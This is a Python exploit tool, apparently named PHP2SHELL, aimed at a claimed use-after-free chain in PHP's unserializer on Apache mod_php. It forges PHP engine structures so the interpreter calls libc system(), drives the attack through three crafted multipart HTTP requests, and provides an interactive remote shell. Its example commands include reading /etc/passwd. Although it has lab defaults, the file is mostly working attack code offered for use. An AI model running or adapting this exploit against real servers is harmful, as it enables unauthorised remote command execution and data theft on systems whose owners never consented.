#!/usr/bin/env python3
"""
PHP2SHELL / CVE-2026-109618+109619 — mod_php interactive exploit
===============================================================

Single interactive tool for the Apache mod_php (prefork) variant of the
unserializer-UAF chain.  It speaks HTTP only; the target-side output is
written by the executed command into a web-readable file and fetched back.

Chain per command:
  store.php : app stores the payload as a session string and aliases it
              (p|s:65500:"...";upload_progress_fk1|R:1;)
  A         : app-level @unserialize() OOM leaves the stale
              php_unserialize_data (BG(unserialize).level = 1)
  B         : multipart PHP_SESSION_UPLOAD_PROGRESS decode in the same
              Apache child reuses the stale decoder; R:1 -> fake
              zend_reference -> fake zend_array -> pDestructor = system()

The B request aborts the Apache child after system() returns (expected);
the prefork master respawns it.  D and libc system() are inherited from
the master, so they stay stable across child respawns while the master
lives.

Lab defaults (php:8.3.33-apache, Apache 2.4.68 prefork, single child):
  target     http://127.0.0.1:18130
  D          0x7fdb5ca6c000
  system     0x7fdb5f919090   (libc system, offset 0x53090)
  struct_off 0x1fe8
  output     /var/www/html/out/o.txt  ->  /out/o.txt

Commands:
  help                      this text
  info                      current settings
  target <url>              set target base URL
  set d|system|struct_off <hex>
  set len <n>               session value length (default 65500)
  set sid <id>              session id
  set filler <n>            A memory filler (default 4000000)
  set elems <n>             A outer array elements (default 40000)
  set out <path>            target filesystem output path
  set outurl <path>         URL path for the output file
  exec <command>            run one command on the target
  shell                     interactive remote shell (exec per line)
  quit / exit               leave

Examples:
  exec id
  exec uname -a
  exec cat /etc/passwd | head
  shell
"""
from __future__ import annotations

import argparse
import http.client
import os
import random
import re
import shlex
import struct
import sys
import time
import urllib.parse

IS_REFERENCE_EX = 10 | (1 << 8)
IS_ARRAY_EX = 7 | (1 << 8)
STRUCT_SIZE = 8216

DEFAULTS = {
    "target": "http://127.0.0.1:18130",
    "d": 0x7FDB5CA6C000,
    "system": 0x7FDB5F919090,
    "struct_off": 0x1FE8,
    "length": 65500,
    "sid": "f2smod00000000000000000000001",
    "filler": 4_000_000,
    "elems": 40_000,
    "out": "/var/www/html/out/o.txt",
    "outurl": "/out/o.txt",
    "timeout": 60.0,
}

STORE_BOUNDARY = b"----f2smodstore00000"
A_BOUNDARY = b"----f2smodfatal00000"
B_BOUNDARY = b"----f2smodupl000000"


# --------------------------------------------------------------------------
# payload construction (same layout as the FPM chain)
# --------------------------------------------------------------------------
def _q(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)


def _d32(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)


def build_payload(d: int, system_addr: int, length: int, struct_file_off: int,
                  cmd: bytes) -> bytes:
    prefix_len = len(b'p|s:%d:"' % length)
    struct_off = struct_file_off - prefix_len
    if struct_off < 0:
        raise ValueError("struct file offset smaller than session prefix")

    payload = bytearray(b"P" * length)
    V = d + 0x2100
    R = d + 0x2180
    S = d + 0x2200
    CMD = d + 0x2300

    # forged php_unserialize_data at D; var_entries is at D + 56
    st = bytearray(STRUCT_SIZE)
    _q(st, 0, d + 56)                 # last = &entries
    _q(st, 56, 1018)                  # used_slots -> force a fresh block
    _q(st, 64, 0)                     # next
    for i in range(1018):
        _q(st, 72 + 8 * i, V)         # entries.data[i] -> fake zval
    payload[struct_off:struct_off + len(st)] = st

    def put(addr: int, data: bytes) -> None:
        off = struct_off + (addr - d)
        if off < 0 or off + len(data) > length:
            raise ValueError("structure %#x outside payload" % addr)
        payload[off:off + len(data)] = data

    # fake zval: IS_REFERENCE -> fake zend_reference
    zv = bytearray(16)
    _q(zv, 0, R)
    _d32(zv, 8, IS_REFERENCE_EX)
    _d32(zv, 12, 0)
    put(V, bytes(zv))

    # fake zend_reference: rc=0 (ZVAL_COPY makes it 1), val = fake array
    ref = bytearray(32)
    _d32(ref, 0, 0)
    _d32(ref, 4, 10)                  # gc.type_info = IS_REFERENCE
    _q(ref, 8, S)
    _d32(ref, 16, IS_ARRAY_EX)
    _d32(ref, 20, 0)
    _q(ref, 24, 0)                    # sources = 0
    put(R, bytes(ref))

    # fake HashTable: pDestructor = system, arData = command string
    ht = bytearray(0x38)
    _d32(ht, 0x00, 1)                 # gc.refcount
    _d32(ht, 0x04, 7)                 # gc.type_info = IS_ARRAY
    _d32(ht, 0x08, 0x10)              # HASH_FLAG_STATIC_KEYS
    _d32(ht, 0x0C, 0xFFFFFFF8)        # nTableMask
    _q(ht, 0x10, CMD)                 # arData
    _d32(ht, 0x18, 1)                 # nNumUsed
    _d32(ht, 0x1C, 0)                 # nNumOfElements
    _d32(ht, 0x20, 8)                 # nTableSize
    _d32(ht, 0x24, 0)
    _q(ht, 0x28, 0)                   # nNextFreeElement
    _q(ht, 0x30, system_addr)         # pDestructor
    put(S, bytes(ht))

    put(CMD, cmd + b"\x00")
    return bytes(payload)


def multipart(boundary: bytes, parts: list[tuple[bytes, bytes, bytes | None]]) -> bytes:
    out = bytearray()
    for name, value, filename in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if filename is not None:
            out += b'; filename="' + filename + b'"'
        out += b"\r\n\r\n" + value + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


# --------------------------------------------------------------------------
# HTTP helpers
# --------------------------------------------------------------------------
class Target:
    def __init__(self, base: str, timeout: float):
        u = urllib.parse.urlsplit(base)
        if not u.hostname:
            raise ValueError("target must be http://host[:port]")
        self.host = u.hostname
        self.port = u.port or (443 if u.scheme == "https" else 80)
        self.scheme = u.scheme or "http"
        self.prefix = u.path.rstrip("/")
        self.timeout = timeout

    def _conn(self):
        cls = http.client.HTTPSConnection if self.scheme == "https" else http.client.HTTPConnection
        return cls(self.host, self.port, timeout=self.timeout)

    def post(self, path: str, body: bytes, sid: str, boundary: bytes,
             timeout: float | None = None):
        conn = self._conn()
        if timeout is not None:
            conn.timeout = timeout
        try:
            conn.request("POST", self.prefix + path, body=body, headers={
                "Content-Type": "multipart/form-data; boundary=" + boundary.decode(),
                "Content-Length": str(len(body)),
                "Cookie": "PHPSESSID=" + sid,
                "Connection": "close",
            })
            resp = conn.getresponse()
            return resp.status, resp.read(512)
        except Exception as exc:
            return None, str(exc).encode()
        finally:
            conn.close()

    def get(self, path: str, timeout: float | None = None):
        conn = self._conn()
        if timeout is not None:
            conn.timeout = timeout
        try:
            conn.request("GET", self.prefix + path, headers={
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Connection": "close",
            })
            resp = conn.getresponse()
            return resp.status, resp.read(1 << 20)
        except Exception as exc:
            return None, str(exc).encode()
        finally:
            conn.close()


# --------------------------------------------------------------------------
# exploit driver
# --------------------------------------------------------------------------
def run_chain(cfg: dict, cmd: str, verbose: bool = True) -> int | None:
    target = Target(cfg["target"], cfg["timeout"])

    # The command writes its stdout/stderr into the target's web-readable
    # output file.  Remove it first (outside the redirection) so stale output
    # is never returned; the redirection then creates a fresh file.
    out_fs = cfg["out"]
    wrapped = "rm -f %s; (%s) > %s 2>&1" % (
        shlex.quote(out_fs), cmd, shlex.quote(out_fs))

    payload = build_payload(cfg["d"], cfg["system"], cfg["length"],
                            cfg["struct_off"], wrapped.encode())
    store_body = multipart(STORE_BOUNDARY, [(b"p", payload, None)])
    elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(cfg["elems"]))
    a_body = multipart(A_BOUNDARY, [
        (b"filler", b"Q" * cfg["filler"], None),
        (b"data", b"a:%d:{%s}" % (cfg["elems"], elems), None),
    ])
    b_body = multipart(B_BOUNDARY, [
        (b"PHPSESSID", cfg["sid"].encode(), None),
        (b"PHP_SESSION_UPLOAD_PROGRESS", b"fk1", None),
        (b"f", b"", b"a"),
    ])

    if verbose:
        print("[*] store ...", end=" ", flush=True)
    status, body = target.post("/store.php", store_body, cfg["sid"], STORE_BOUNDARY)
    if verbose:
        print(status, body[:80].decode("latin1", "replace"))
    if status != 200:
        print("[!] store failed (%s): %s" % (status, body[:200]))
        return None

    if verbose:
        print("[*] A (unserialize OOM) ...", end=" ", flush=True)
    status, body = target.post("/index.php", a_body, cfg["sid"], A_BOUNDARY)
    if verbose:
        print(status)
    if status not in (500, None):
        print("[!] A did not fatal (status %s); check filler/memory_limit" % status)

    if verbose:
        print("[*] B (upload-progress decode) ...", end=" ", flush=True)
    status, body = target.post("/index.php", b_body, cfg["sid"], B_BOUNDARY, timeout=15.0)
    if verbose:
        print("connection dropped (expected)" if status is None else status)

    # The child aborts after system(); the prefork master respawns it.
    time.sleep(0.5)
    for attempt in range(30):
        path = cfg["outurl"] + ("?%d" % random.getrandbits(48))
        status, body = target.get(path, timeout=10.0)
        if status == 200:
            if verbose:
                print("[*] output:")
            try:
                sys.stdout.write(body.decode("utf-8", "replace"))
            except Exception:
                sys.stdout.buffer.write(body)
            if body and not body.endswith(b"\n"):
                print()
            return 0
        time.sleep(0.2)

    print("[!] no output file at %s (command may have failed or the child "
          "did not respawn)" % cfg["outurl"])
    return None


# --------------------------------------------------------------------------
# REPL
# --------------------------------------------------------------------------
def print_info(cfg: dict) -> None:
    print("target      : %s" % cfg["target"])
    print("D           : %#x" % cfg["d"])
    print("system      : %#x" % cfg["system"])
    print("struct_off  : %#x" % cfg["struct_off"])
    print("length      : %d" % cfg["length"])
    print("sid         : %s" % cfg["sid"])
    print("filler      : %d" % cfg["filler"])
    print("elems       : %d" % cfg["elems"])
    print("output fs   : %s" % cfg["out"])
    print("output url  : %s" % cfg["outurl"])


def parse_hex(value: str) -> int:
    return int(value, 0)


def repl(cfg: dict) -> int:
    print("PHP2SHELL mod_php interactive exploit")
    print("target %s  D=%#x  system=%#x" % (cfg["target"], cfg["d"], cfg["system"]))
    print("type 'help' for commands; each exec restarts the Apache child (expected)")
    while True:
        try:
            line = input("php2shell(modphp)> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0
        if not line:
            continue
        low = line.lower()
        if low in ("quit", "exit"):
            return 0
        if low == "help":
            print(__doc__.strip().split("Commands:", 1)[1].split("Examples:", 1)[0].strip())
            continue
        if low == "info":
            print_info(cfg)
            continue
        if low.startswith("target "):
            cfg["target"] = line.split(None, 1)[1].strip()
            print("[*] target = %s" % cfg["target"])
            continue
        if low.startswith("set "):
            parts = line.split(None, 2)
            if len(parts) < 3:
                print("[!] usage: set <key> <value>")
                continue
            key, val = parts[1].lower(), parts[2].strip()
            try:
                if key in ("d", "system", "struct_off"):
                    cfg[key] = parse_hex(val)
                elif key in ("len", "length"):
                    cfg["length"] = int(val, 0)
                elif key == "sid":
                    cfg["sid"] = val
                elif key == "filler":
                    cfg["filler"] = int(val, 0)
                elif key == "elems":
                    cfg["elems"] = int(val, 0)
                elif key == "out":
                    cfg["out"] = val
                elif key == "outurl":
                    cfg["outurl"] = val
                elif key == "timeout":
                    cfg["timeout"] = float(val)
                else:
                    print("[!] unknown key %s" % key)
                    continue
                print("[*] %s = %s" % (key, cfg[key] if not isinstance(cfg[key], int) or key in ("length", "filler", "elems", "timeout") else hex(cfg[key])))
            except ValueError as exc:
                print("[!] bad value: %s" % exc)
            continue
        if low.startswith("exec "):
            cmd = line.split(None, 1)[1]
            run_chain(cfg, cmd)
            continue
        if low == "shell":
            print("[*] remote shell mode; empty line or 'back' returns")
            while True:
                try:
                    rcmd = input("php2shell(target)> ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    return 0
                if not rcmd or rcmd.lower() in ("back", "exit", "quit"):
                    break
                run_chain(cfg, rcmd)
            continue
        print("[!] unknown command; type 'help'")


def main() -> int:
    ap = argparse.ArgumentParser(description="PHP2SHELL mod_php interactive exploit")
    ap.add_argument("--target", default=DEFAULTS["target"])
    ap.add_argument("--d", type=lambda x: int(x, 0), default=DEFAULTS["d"])
    ap.add_argument("--system", type=lambda x: int(x, 0), default=DEFAULTS["system"])
    ap.add_argument("--struct-off", type=lambda x: int(x, 0), default=DEFAULTS["struct_off"])
    ap.add_argument("--length", type=int, default=DEFAULTS["length"])
    ap.add_argument("--sid", default=DEFAULTS["sid"])
    ap.add_argument("--filler", type=int, default=DEFAULTS["filler"])
    ap.add_argument("--elems", type=int, default=DEFAULTS["elems"])
    ap.add_argument("--out", default=DEFAULTS["out"])
    ap.add_argument("--outurl", default=DEFAULTS["outurl"])
    ap.add_argument("--exec", dest="one", default=None, help="run one command and exit")
    args = ap.parse_args()

    cfg = dict(DEFAULTS)
    cfg.update({
        "target": args.target,
        "d": args.d,
        "system": args.system,
        "struct_off": args.struct_off,
        "length": args.length,
        "sid": args.sid,
        "filler": args.filler,
        "elems": args.elems,
        "out": args.out,
        "outurl": args.outurl,
    })
    if args.one is not None:
        return 0 if run_chain(cfg, args.one) == 0 else 1
    return repl(cfg)


if __name__ == "__main__":
    raise SystemExit(main())
